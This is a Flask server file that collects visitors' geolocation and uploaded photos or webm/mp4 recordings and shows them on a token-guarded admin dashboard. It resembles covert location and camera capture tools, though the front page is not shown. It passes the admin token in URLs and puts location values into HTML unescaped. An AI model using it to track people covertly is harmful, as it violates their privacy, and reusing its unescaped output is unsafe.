from flask import Flask, request, jsonify, send_from_directory
from pathlib import Path
from datetime import datetime
import json
import secrets

app = Flask(__name__)

BASE_DIR = Path(__file__).resolve().parent
UPLOAD_DIR = BASE_DIR / "uploads"
DATA_DIR = BASE_DIR / "data"

UPLOAD_DIR.mkdir(exist_ok=True)
DATA_DIR.mkdir(exist_ok=True)

LOCATION_FILE = DATA_DIR / "locations.json"

# Change this before deployment.
ADMIN_TOKEN = "CHANGE_THIS_TO_A_LONG_RANDOM_PASSWORD"


def load_locations():
    if not LOCATION_FILE.exists():
        return []

    try:
        return json.loads(
            LOCATION_FILE.read_text(encoding="utf-8")
        )
    except Exception:
        return []


def save_locations(data):
    LOCATION_FILE.write_text(
        json.dumps(
            data,
            indent=2
        ),
        encoding="utf-8"
    )


@app.route("/")
def home():
    return send_from_directory(
        BASE_DIR,
        "index.html"
    )


@app.post("/api/location")
def receive_location():

    data = request.get_json(silent=True)

    if not data:
        return jsonify({
            "error": "Invalid data"
        }), 400

    if "latitude" not in data or "longitude" not in data:
        return jsonify({
            "error": "Location is incomplete"
        }), 400

    record = {
        "latitude": data["latitude"],
        "longitude": data["longitude"],
        "accuracy": data.get("accuracy"),
        "time": datetime.utcnow().isoformat() + "Z"
    }

    locations = load_locations()

    locations.append(record)

    save_locations(locations)

    return jsonify({
        "success": True
    })


@app.post("/api/upload")
def upload_file():

    uploaded = request.files.get("file")

    if not uploaded:
        return jsonify({
            "error": "No file received"
        }), 400

    filename = uploaded.filename or ""

    allowed_extensions = {
        ".jpg",
        ".jpeg",
        ".png",
        ".webm",
        ".mp4"
    }

    extension = Path(filename).suffix.lower()

    if extension not in allowed_extensions:
        return jsonify({
            "error": "File type not allowed"
        }), 400

    safe_name = (
        secrets.token_hex(12)
        + extension
    )

    destination = UPLOAD_DIR / safe_name

    uploaded.save(destination)

    return jsonify({
        "success": True,
        "message": "Media uploaded successfully."
    })


@app.get("/admin")
def admin():

    token = request.args.get("token")

    if token != ADMIN_TOKEN:
        return "Unauthorized", 401

    locations = load_locations()

    files = []

    for file in UPLOAD_DIR.iterdir():

        if file.is_file():

            files.append({
                "name": file.name,
                "url":
                    f"/admin/download/{file.name}?token={ADMIN_TOKEN}"
            })

    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <title>Admin Dashboard</title>

        <style>
            body {
                font-family: Arial;
                background: #0b1020;
                color: white;
                padding: 30px;
            }

            .card {
                background: #151b30;
                padding: 20px;
                margin-bottom: 20px;
                border-radius: 15px;
            }

            a {
                color: #63c7ff;
            }

            iframe {
                width: 100%;
                height: 350px;
                border: 0;
                border-radius: 15px;
            }
        </style>
    </head>

    <body>

        <h1>Admin Dashboard</h1>

        <div class="card">
            <h2>📍 Locations</h2>
    """

    if not locations:
        html += "<p>No locations received.</p>"

    for item in locations:

        html += f"""
        <p>
            Latitude: {item["latitude"]}<br>
            Longitude: {item["longitude"]}<br>
            Accuracy: {item.get("accuracy")} m<br>
            Time: {item["time"]}
        </p>

        <hr>
        """

    html += """
        </div>

        <div class="card">
            <h2>📁 Uploaded Media</h2>
    """

    if not files:
        html += "<p>No media uploaded.</p>"

    for file in files:

        html += f"""
        <p>
            <a href="{file["url"]}">
                ⬇️ Download {file["name"]}
            </a>
        </p>
        """

    html += """
        </div>

    </body>
    </html>
    """

    return html


@app.get("/admin/download/<filename>")
def download_file(filename):

    token = request.args.get("token")

    if token != ADMIN_TOKEN:
        return "Unauthorized", 401

    safe_file = Path(filename).name

    return send_from_directory(
        UPLOAD_DIR,
        safe_file,
        as_attachment=True
    )


if __name__ == "__main__":

    print("Server running...")
    print("Open: http://127.0.0.1:5000")

    app.run(
        host="0.0.0.0",
        port=5000,
        debug=False
  )
